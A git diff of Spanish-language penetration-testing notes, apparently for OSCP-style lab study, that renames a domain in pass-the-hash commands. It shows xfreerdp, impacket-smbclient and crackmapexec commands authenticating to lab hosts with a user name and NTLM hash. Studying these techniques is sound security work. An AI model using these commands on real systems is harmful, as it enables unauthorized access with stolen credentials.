@@ -12,7 +12,7 @@ Se puede conseguir con mimikatz, secretdump, de la SAM o de la NTDS.
 ### OPTION 1: RDP
 
 ```
-xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:celia.almeda /pth:e728ecbadfb02f51ce8eed753f3ff3fd /v:10.10.94.142 /d:oscp.exam
+xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:celia.almeda /pth:e728ecbadfb02f51ce8eed753f3ff3fd /v:10.10.94.142 /d:test.exam
 ```
 
 ### OPTION 1: SMB
@@ -24,7 +24,7 @@ crackmapexec winrm 10.10.94.142 -u "celia.almeda" -H "e728ecbadfb02f51ce8eed753f
 Se puede comprobar también WINRM desde aquí
 
 ```
-impacket-smbclient oscp.exam/celia.almeda@10.10.94.140 -hashes ':e728ecbadfb02f51ce8eed753f3ff3fd'
+impacket-smbclient test.exam/celia.almeda@10.10.94.140 -hashes ':e728ecbadfb02f51ce8eed753f3ff3fd'
 ```
 
 ### OPTION 1: WINRM
